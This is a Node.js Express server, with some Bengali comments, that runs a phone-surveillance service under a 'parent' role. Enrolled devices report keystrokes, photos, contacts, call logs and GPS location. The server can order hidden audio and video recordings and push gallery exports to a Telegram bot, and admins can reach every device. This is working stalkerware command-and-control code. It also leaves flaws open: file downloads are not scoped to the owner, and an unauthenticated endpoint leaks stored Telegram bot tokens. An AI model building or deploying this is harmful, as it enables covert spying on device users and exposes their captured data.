const express = require("express");
const path = require("path");
const { Pool } = require("pg");
const bcrypt = require("bcrypt");
const session = require("express-session");
const pgSession = require("connect-pg-simple")(session);
const multer = require('multer');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
app.set("trust proxy", 1);

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
});

app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true }));

// অডিও আপলোড স্টোরেজ
const audioStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(__dirname, 'uploads', 'audio');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, 'audio-' + uniqueSuffix + path.extname(file.originalname));
  }
});
const uploadAudio = multer({ storage: audioStorage, limits: { fileSize: 50 * 1024 * 1024 } });

// ভিডিও আপলোড স্টোরেজ
const videoStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(__dirname, 'uploads', 'video');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, 'video-' + uniqueSuffix + path.extname(file.originalname));
  }
});
const uploadVideo = multer({ storage: videoStorage, limits: { fileSize: 100 * 1024 * 1024 } });

app.use(
  session({
    store: new pgSession({ pool, tableName: "user_sessions", createTableIfMissing: true }),
    secret: process.env.SESSION_SECRET || "change-this-secret-in-render",
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true, secure: false, sameSite: "lax", maxAge: 1000 * 60 * 60 * 24 * 7 }
  })
);

// ================= DATABASE SETUP =================
async function setupDatabase() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role VARCHAR(20) DEFAULT 'parent',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(20) DEFAULT 'parent'`);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        owner_user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
        device_id VARCHAR(255) UNIQUE NOT NULL,
        device_token TEXT NOT NULL,
        device_name VARCHAR(255) NOT NULL,
        battery INTEGER DEFAULT 0,
        online BOOLEAN DEFAULT FALSE,
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id VARCHAR(255)`);
    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS device_features (
        device_id VARCHAR(255) PRIMARY KEY,
        gps BOOLEAN DEFAULT TRUE,
        gallery BOOLEAN DEFAULT TRUE,
        keylogger BOOLEAN DEFAULT TRUE,
        audio BOOLEAN DEFAULT TRUE,
        video BOOLEAN DEFAULT TRUE,
        contacts BOOLEAN DEFAULT TRUE
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS user_telegram (
        user_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
        bot_token TEXT,
        chat_id TEXT
      );
    `);

    console.log("Database ready.");
  } catch (err) {
    console.error("Setup failed:", err);
  }
}
setupDatabase();

// স্বয়ংক্রিয়ভাবে admin email promote করুন (Environment variable থেকে)
async function promoteAdmin() {
  try {
    const adminEmail = process.env.ADMIN_EMAIL;
    if (adminEmail) {
      const normalized = adminEmail.trim().toLowerCase();
      const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [normalized]);
      if (userRes.rows.length > 0) {
        await pool.query("UPDATE users SET role='admin' WHERE id=$1", [userRes.rows[0].id]);
        console.log(`User ${normalized} promoted to admin.`);
      }
    }
  } catch (e) {
    console.error("Admin promotion failed:", e);
  }
}
promoteAdmin();

function requireLogin(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ authenticated: false, error: "Login required." });
  next();
}

function requireAdmin(req, res, next) {
  if (req.session.role !== 'admin') return res.status(403).json({ error: "Admin access required." });
  next();
}

// ================= AUTH =================
app.post("/api/signup", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: "Email and password required." });
    if (password.length < 8) return res.status(400).json({ error: "Password must be at least 8 characters." });
    const normalizedEmail = email.trim().toLowerCase();
    const existing = await pool.query("SELECT id FROM users WHERE email=$1", [normalizedEmail]);
    if (existing.rows.length > 0) return res.status(409).json({ error: "Account already exists." });
    const passwordHash = await bcrypt.hash(password, 12);
    const result = await pool.query(
      "INSERT INTO users (email, password_hash, role) VALUES ($1,$2,'parent') RETURNING id, email, role, created_at",
      [normalizedEmail, passwordHash]
    );
    req.session.userId = result.rows[0].id;
    req.session.role = result.rows[0].role;
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: "Session save failed." });
      res.status(201).json({ message: "Account created.", user: result.rows[0] });
    });
  } catch (e) { console.error(e); res.status(500).json({ error: "Signup failed." }); }
});

app.post("/api/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: "Email and password required." });
    const normalizedEmail = email.trim().toLowerCase();
    const result = await pool.query("SELECT id, email, password_hash, role FROM users WHERE email=$1", [normalizedEmail]);
    if (result.rows.length === 0) return res.status(401).json({ error: "Invalid email or password." });
    const user = result.rows[0];
    const ok = await bcrypt.compare(password, user.password_hash);
    if (!ok) return res.status(401).json({ error: "Invalid email or password." });
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: "Session save failed." });
      res.json({ message: "Login successful.", user: { id: user.id, email: user.email, role: user.role } });
    });
  } catch (e) { console.error(e); res.status(500).json({ error: "Login failed." }); }
});

app.get("/api/me", requireLogin, async (req, res) => {
  try {
    const result = await pool.query("SELECT id, email, role, created_at FROM users WHERE id=$1", [req.session.userId]);
    if (result.rows.length === 0) return res.status(401).json({ authenticated: false });
    res.json({ authenticated: true, user: result.rows[0] });
  } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
});

// ================= DEVICE STATE =================
const deviceStates = new Map();
const keylogs = [];
const deviceUIs = new Map();
const galleryData = new Map();
const galleryRequestFlags = new Map();
const gpsRequestFlags = new Map();
const audioRequestFlags = new Map();
const videoRequestFlags = new Map();
const callLogsData = new Map();
const contactsData = new Map();
const exportRequestFlags = new Map(); // নতুন
const userFeaturesData = new Map(); // নতুন: ইউজারের ফিচার পারমিশন

app.post("/api/device-state", async (req, res) => {
  try {
    const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude, accuracy } = req.body;
    if (!ownerEmail || !deviceId || !deviceToken) return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });

    const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [ownerEmail.toLowerCase().trim()]);
    if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
    const userId = userRes.rows[0].id;

    const existing = await pool.query("SELECT id FROM devices WHERE device_id=$1", [deviceId]);
    if (existing.rows.length > 0) {
      await pool.query(
        "UPDATE devices SET device_token=$1, device_name=$2, battery=$3, online=TRUE, last_seen=CURRENT_TIMESTAMP WHERE device_id=$4",
        [deviceToken, deviceName || "Unknown Device", battery ?? 0, deviceId]
      );
    } else {
      await pool.query(
        "INSERT INTO devices (owner_user_id, device_id, device_token, device_name, battery, online, last_seen) VALUES ($1,$2,$3,$4,$5,TRUE,CURRENT_TIMESTAMP)",
        [userId, deviceId, deviceToken, deviceName || "Unknown Device", battery ?? 0]
      );
      await pool.query("INSERT INTO device_features (device_id) VALUES ($1) ON CONFLICT DO NOTHING", [deviceId]);
    }

    deviceStates.set(deviceId, {
      deviceName: deviceName || "Unknown Device",
      battery: battery ?? 0,
      installedApps: installedApps || [],
      latitude: latitude ?? null,
      longitude: longitude ?? null,
      accuracy: accuracy ?? null,
      last_seen: Date.now()
    });
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "State update failed" }); }
});

app.get("/api/device-state", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  const live = deviceStates.get(deviceId);
  if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], latitude: null, longitude: null, accuracy: null, last_seen: 0 });
  res.json(live);
});

app.get("/api/devices", requireLogin, async (req, res) => {
  try {
    if (req.session.role === 'admin') {
      const result = await pool.query(
        "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices ORDER BY created_at DESC"
      );
      return res.json(result.rows);
    }
    const result = await pool.query(
      "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices WHERE owner_user_id=$1 ORDER BY created_at DESC",
      [req.session.userId]
    );
    const devices = result.rows.map(row => {
      const live = deviceStates.get(row.device_id);
      if (live && live.last_seen > Date.now() - 120000) {
        row.online = true;
        row.battery = live.battery ?? row.battery;
      } else {
        row.online = false;
      }
      return row;
    });
    res.json(devices);
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to load devices." }); }
});

// ================= KEYLOGGER & UI =================
app.post("/api/keylog", async (req, res) => {
  try {
    const { deviceId, deviceToken, text, timestamp } = req.body;
    if (!deviceId || !deviceToken || !text) return res.status(400).json({ error: "deviceId, deviceToken and text required" });
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
    const feature = await pool.query("SELECT keylogger FROM device_features WHERE device_id=$1", [deviceId]);
    if (feature.rows.length > 0 && feature.rows[0].keylogger === false) {
      return res.status(403).json({ error: "Keylogger disabled by admin." });
    }
    keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save keylog." }); }
});

app.get("/api/keylog", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
  res.json(keylogs.filter(k => k.deviceId === deviceId));
});

// ================= GALLERY =================
app.post("/api/gallery/request", requireLogin, async (req, res) => {
  const { deviceId, count } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  const feature = await pool.query("SELECT gallery FROM device_features WHERE device_id=$1", [deviceId]);
  if (feature.rows.length > 0 && feature.rows[0].gallery === false) {
    return res.status(403).json({ error: "Gallery disabled by admin." });
  }
  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
  galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
  res.json({ success: true, count: safeCount });
});

app.get("/api/gallery/request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const flag = galleryRequestFlags.get(deviceId);
  if (flag) {
    galleryRequestFlags.delete(deviceId);
    res.json({ requested: true, count: flag.count });
  } else {
    res.json({ requested: false, count: 100 });
  }
});

app.post("/api/gallery/upload", async (req, res) => {
  try {
    const { deviceId, deviceToken, media } = req.body;
    if (!deviceId || !deviceToken || !Array.isArray(media)) {
      return res.status(400).json({ error: "deviceId, deviceToken, media array required" });
    }
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
      return res.status(401).json({ error: "Invalid device token." });
    }
    const latest = media.slice(0, 500);
    galleryData.set(deviceId, latest);
    res.json({ success: true, count: latest.length });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Gallery upload failed" });
  }
});

app.get("/api/gallery", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  const media = galleryData.get(deviceId) || [];
  res.json({ media });
});

// ================= GPS REQUEST =================
app.post("/api/gps/request", requireLogin, async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  const feature = await pool.query("SELECT gps FROM device_features WHERE device_id=$1", [deviceId]);
  if (feature.rows.length > 0 && feature.rows[0].gps === false) {
    return res.status(403).json({ error: "GPS disabled by admin." });
  }
  gpsRequestFlags.set(deviceId, true);
  res.json({ success: true });
});

app.get("/api/gps/request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const requested = gpsRequestFlags.get(deviceId) || false;
  if (requested) gpsRequestFlags.delete(deviceId);
  res.json({ requested });
});

// ================= AUDIO RECORDING =================
app.post("/api/audio/request", requireLogin, async (req, res) => {
  try {
    const { deviceId, duration } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    if (!duration || isNaN(duration) || duration < 10 || duration > 300) {
      return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
    }
    const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
      return res.status(403).json({ error: "Not your device." });
    }
    const feature = await pool.query("SELECT audio FROM device_features WHERE device_id=$1", [deviceId]);
    if (feature.rows.length > 0 && feature.rows[0].audio === false) {
      return res.status(403).json({ error: "Audio recording disabled by admin." });
    }
    audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
    res.json({ success: true, requestedDuration: duration });
  } catch (e) { console.error(e); res.status(500).json({ error: "Audio request failed" }); }
});

app.get("/api/audio/request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const flag = audioRequestFlags.get(deviceId);
  if (flag) {
    audioRequestFlags.delete(deviceId);
    res.json({ requested: true, duration: flag.duration });
  } else {
    res.json({ requested: false });
  }
});

app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
  try {
    const { deviceId, deviceToken } = req.body;
    if (!deviceId || !deviceToken || !req.file) {
      return res.status(400).json({ error: "deviceId, deviceToken and audio file required" });
    }
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
      fs.unlink(req.file.path, () => {});
      return res.status(401).json({ error: "Invalid device token." });
    }
    // deviceId দিয়ে ফাইলের নাম বদলান
    const newFilename = `${deviceId}_${req.file.filename}`;
    const newPath = path.join(__dirname, 'uploads', 'audio', newFilename);
    fs.renameSync(req.file.path, newPath);
    res.json({ success: true, filePath: newPath });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Audio upload failed" });
  }
});

app.get("/api/audio/list", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  const dir = path.join(__dirname, 'uploads', 'audio');
  fs.readdir(dir, (err, files) => {
    if (err) return res.status(500).json({ error: "Failed to list audio files" });
    const userFiles = files.filter(f => f.startsWith(`${deviceId}_`));
    res.json({ files: userFiles });
  });
});

app.get("/api/audio/download/:filename", requireLogin, async (req, res) => {
  const filename = req.params.filename;
  const safeFilename = path.basename(filename);
  const filePath = path.join(__dirname, 'uploads', 'audio', safeFilename);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "File not found" });
  res.download(filePath);
});

// ================= VIDEO RECORDING =================
app.post("/api/video/request", requireLogin, async (req, res) => {
  try {
    const { deviceId, duration, cameraType } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    if (!duration || isNaN(duration) || duration < 5 || duration > 30) {
      return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
    }
    const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
      return res.status(403).json({ error: "Not your device." });
    }
    const feature = await pool.query("SELECT video FROM device_features WHERE device_id=$1", [deviceId]);
    if (feature.rows.length > 0 && feature.rows[0].video === false) {
      return res.status(403).json({ error: "Video recording disabled by admin." });
    }
    const safeCameraType = (cameraType === 0 || cameraType === 1) ? cameraType : 1;
    videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: safeCameraType });
    res.json({ success: true, requestedDuration: duration, cameraType: safeCameraType });
  } catch (e) { console.error(e); res.status(500).json({ error: "Video request failed" }); }
});

app.get("/api/video/request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const flag = videoRequestFlags.get(deviceId);
  if (flag) {
    videoRequestFlags.delete(deviceId);
    res.json({ requested: true, duration: flag.duration, cameraType: flag.cameraType });
  } else {
    res.json({ requested: false });
  }
});

app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
  try {
    const { deviceId, deviceToken } = req.body;
    if (!deviceId || !deviceToken || !req.file) {
      return res.status(400).json({ error: "deviceId, deviceToken and video file required" });
    }
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
      fs.unlink(req.file.path, () => {});
      return res.status(401).json({ error: "Invalid device token." });
    }
    const newFilename = `${deviceId}_${req.file.filename}`;
    const newPath = path.join(__dirname, 'uploads', 'video', newFilename);
    fs.renameSync(req.file.path, newPath);
    res.json({ success: true, filePath: newPath });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Video upload failed" });
  }
});

app.get("/api/video/list", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  const dir = path.join(__dirname, 'uploads', 'video');
  fs.readdir(dir, (err, files) => {
    if (err) return res.status(500).json({ error: "Failed to list video files" });
    const userFiles = files.filter(f => f.startsWith(`${deviceId}_`));
    res.json({ files: userFiles });
  });
});

app.get("/api/video/download/:filename", requireLogin, async (req, res) => {
  const filename = req.params.filename;
  const safeFilename = path.basename(filename);
  const filePath = path.join(__dirname, 'uploads', 'video', safeFilename);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "File not found" });
  res.download(filePath);
});

// ================= CALL LOGS & CONTACTS =================
app.post("/api/calllogs", async (req, res) => {
  try {
    const { deviceId, deviceToken, callLogs } = req.body;
    if (!deviceId || !deviceToken || !Array.isArray(callLogs)) {
      return res.status(400).json({ error: "deviceId, deviceToken and callLogs array required" });
    }
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
      return res.status(401).json({ error: "Invalid device token." });
    }
    const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
    if (feature.rows.length > 0 && feature.rows[0].contacts === false) {
      return res.status(403).json({ error: "Contacts disabled by admin." });
    }
    callLogsData.set(deviceId, callLogs);
    res.json({ success: true, count: callLogs.length });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to save call logs" });
  }
});

app.post("/api/contacts", async (req, res) => {
  try {
    const { deviceId, deviceToken, contacts } = req.body;
    if (!deviceId || !deviceToken || !Array.isArray(contacts)) {
      return res.status(400).json({ error: "deviceId, deviceToken and contacts array required" });
    }
    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
      return res.status(401).json({ error: "Invalid device token." });
    }
    const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
    if (feature.rows.length > 0 && feature.rows[0].contacts === false) {
      return res.status(403).json({ error: "Contacts disabled by admin." });
    }
    contactsData.set(deviceId, contacts);
    res.json({ success: true, count: contacts.length });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Failed to save contacts" });
  }
});

app.get("/api/calllogs", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  res.json({ callLogs: callLogsData.get(deviceId) || [] });
});

app.get("/api/contacts", requireLogin, async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
    return res.status(403).json({ error: "Not your device." });
  }
  res.json({ contacts: contactsData.get(deviceId) || [] });
});

// ================= TELEGRAM SETTINGS & EXPORT =================
app.post("/api/telegram/settings", requireLogin, async (req, res) => {
  try {
    const { botToken, chatId } = req.body;
    if (!botToken || !chatId) return res.status(400).json({ error: "Bot token and chat ID required." });
    await pool.query(
      `INSERT INTO user_telegram (user_id, bot_token, chat_id) VALUES ($1,$2,$3)
       ON CONFLICT (user_id) DO UPDATE SET bot_token=$2, chat_id=$3`,
      [req.session.userId, botToken, chatId]
    );
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save Telegram settings." }); }
});

app.get("/api/telegram/settings", requireLogin, async (req, res) => {
  try {
    const result = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
    if (result.rows.length === 0) return res.json({ botToken: null, chatId: null });
    res.json({ botToken: result.rows[0].bot_token, chatId: result.rows[0].chat_id });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch Telegram settings." }); }
});

// নতুন: Export request flag set করা, ডিভাইস সরাসরি পাঠাবে
app.post("/api/gallery/export", requireLogin, async (req, res) => {
  try {
    const { deviceId } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
      return res.status(403).json({ error: "Not your device." });
    }

    const tgRes = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
    if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) {
      return res.status(400).json({ error: "Telegram bot not configured. Please set bot token and chat ID in Settings." });
    }

    exportRequestFlags.set(deviceId, {
      requested: true,
      botToken: tgRes.rows[0].bot_token,
      chatId: tgRes.rows[0].chat_id
    });

    res.json({ success: true, message: "Export request sent to device. It will send media directly to Telegram." });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Gallery export failed." });
  }
});

// ডিভাইস এই endpoint থেকে export request পাবে
app.get("/api/gallery/export-request", async (req, res) => {
  const { deviceId } = req.query;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const flag = exportRequestFlags.get(deviceId);
  if (flag) {
    exportRequestFlags.delete(deviceId);
    res.json({ requested: true, botToken: flag.botToken, chatId: flag.chatId });
  } else {
    res.json({ requested: false });
  }
});

// ডিভাইস export শেষে জানাবে (ঐচ্ছিক)
app.post("/api/gallery/export-done", async (req, res) => {
  const { deviceId, deviceToken, sentCount } = req.body;
  console.log(`Export done for ${deviceId}, sent ${sentCount} items.`);
  res.json({ success: true });
});

// ================= ADMIN API =================
app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
  try {
    const result = await pool.query("SELECT id AS uid, email, role, created_at FROM users ORDER BY id DESC");
    const users = [];
    for (const u of result.rows) {
      const deviceCount = await pool.query("SELECT COUNT(*) FROM devices WHERE owner_user_id=$1", [u.uid]);
      const buildCount = 0; // placeholder
      const features = userFeaturesData.get(u.uid) || {
        deviceInfo: true,
        battery: true,
        gps: true,
        installedApps: true,
        activity: true,
        notifications: true,
        sync: true,
        remoteConfig: true
      };
      users.push({
        uid: u.uid,
        name: u.email, // in absence of name field, use email prefix
        email: u.email,
        role: u.role === 'admin' ? 'ADMIN' : 'USER',
        deviceCount: parseInt(deviceCount.rows[0].count),
        buildCount: buildCount,
        lastActive: null,
        features: features
      });
    }
    res.json({ users });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch users." }); }
});

app.get("/api/admin/devices", requireLogin, requireAdmin, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT d.device_id, d.device_name, d.battery, d.online, d.last_seen, u.email AS owner_email,
              df.gps, df.gallery, df.keylogger, df.audio, df.video, df.contacts
       FROM devices d
       JOIN users u ON d.owner_user_id = u.id
       LEFT JOIN device_features df ON d.device_id = df.device_id
       ORDER BY d.last_seen DESC`
    );
    res.json({ devices: result.rows });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices." }); }
});

app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, res) => {
  try {
    const { deviceId, feature, enabled } = req.body;
    if (!deviceId || !feature) return res.status(400).json({ error: "deviceId and feature required." });
    const allowedFeatures = ['gps', 'gallery', 'keylogger', 'audio', 'video', 'contacts'];
    if (!allowedFeatures.includes(feature)) return res.status(400).json({ error: "Invalid feature." });

    await pool.query(
      `INSERT INTO device_features (device_id, ${feature}) VALUES ($1, $2)
       ON CONFLICT (device_id) DO UPDATE SET ${feature} = $2`,
      [deviceId, enabled === true]
    );
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update feature." }); }
});

// ================= ADMIN ACTION ENDPOINTS =================
app.post("/api/admin/gps/request", requireLogin, requireAdmin, async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  gpsRequestFlags.set(deviceId, true);
  res.json({ success: true });
});

app.post("/api/admin/audio/request", requireLogin, requireAdmin, async (req, res) => {
  try {
    const { deviceId, duration } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    if (!duration || isNaN(duration) || duration < 10 || duration > 300) {
      return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
    }
    audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
    res.json({ success: true, requestedDuration: duration });
  } catch (e) { console.error(e); res.status(500).json({ error: "Audio request failed" }); }
});

app.post("/api/admin/video/request", requireLogin, requireAdmin, async (req, res) => {
  try {
    const { deviceId, duration, cameraType } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    if (!duration || isNaN(duration) || duration < 5 || duration > 30) {
      return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
    }
    const safeCameraType = (cameraType === 0 || cameraType === 1) ? cameraType : 1;
    videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: safeCameraType });
    res.json({ success: true, requestedDuration: duration, cameraType: safeCameraType });
  } catch (e) { console.error(e); res.status(500).json({ error: "Video request failed" }); }
});

app.post("/api/admin/gallery/request", requireLogin, requireAdmin, async (req, res) => {
  const { deviceId, count } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
  galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
  res.json({ success: true, count: safeCount });
});

